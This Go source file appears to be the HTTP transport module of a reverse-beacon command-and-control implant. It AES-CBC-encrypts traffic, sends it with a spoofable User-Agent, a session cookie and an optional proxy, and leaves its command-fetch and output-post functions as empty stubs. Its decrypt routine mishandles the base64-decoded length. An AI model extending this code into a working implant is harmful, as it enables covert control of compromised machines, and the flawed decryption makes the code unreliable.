package packet

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"http_reverse_beacon/profile"

	"github.com/imroc/req"
)

func init() {
}

var httpReqeust = req.New()

// pkcs7 padding
func pad(data []byte) []byte {
	padSize := aes.BlockSize - len(data)%aes.BlockSize
	padding := bytes.Repeat([]byte{byte(padSize)}, padSize)
	return append(data, padding...)
}

func unpad(data []byte) []byte {
	length := len(data)
	if length == 0 {
		return nil
	}
	unPadding := int(data[length-1])
	return data[:(length - unPadding)]
}

func encrypt(plainData []byte) (cipherData []byte) {
	block, err := aes.NewCipher(profile.SessionKey)
	if err != nil {
		return nil
	}
	plainPadding := pad(plainData)
	cipherData = make([]byte, len(plainPadding))
	blockMode := cipher.NewCBCEncrypter(block, profile.RandomIV)
	blockMode.CryptBlocks(cipherData, plainPadding)
	cipherData = []byte(base64.StdEncoding.EncodeToString(cipherData))
	return cipherData
}

func decrypt(cipherData []byte) (plainData []byte) {
	base64.StdEncoding.Decode(cipherData, cipherData)
	block, err := aes.NewCipher(profile.SessionKey)
	if err != nil {
		return nil
	}
	blockMode := cipher.NewCBCDecrypter(block, profile.RandomIV)
	plainData = make([]byte, len(cipherData))
	blockMode.CryptBlocks(plainData, cipherData)
	plainData = unpad(plainData)
	return plainData
}

func HttpPost(url string, data []byte) (resp *req.Resp) {
	headers := req.Header{
		"User-Agent": profile.UserAgent,
		"Accept":     "*/*",
		"Cookie":     fmt.Sprintf(profile.SessionFormat, profile.SessionID),
	}
	if profile.ProxyUrl != "" {
		httpReqeust.SetProxyUrl(profile.ProxyUrl)
	}
	edata := []byte{}
	if data != nil {
		edata = encrypt(data)
	}
	resp, err := httpReqeust.Post(url, edata, headers)
	if err != nil {
		return nil
	}
	return resp
}

func HttpGet(url string, data []byte) (resp *req.Resp) {
	headers := req.Header{
		"User-Agent": profile.UserAgent,
		"Accept":     "*/*",
		"Cookie":     fmt.Sprintf(profile.SessionFormat, profile.SessionID),
	}
	if profile.ProxyUrl != "" {
		httpReqeust.SetProxyUrl(profile.ProxyUrl)
	}
	resp, err := httpReqeust.Get(url, headers)
	if err != nil {
		return nil
	}
	return resp
}

func GetCommandRequest() (resp *req.Resp) {
	return nil
}

func PostOutputReqeust() (resp *req.Resp) {
	return nil
}
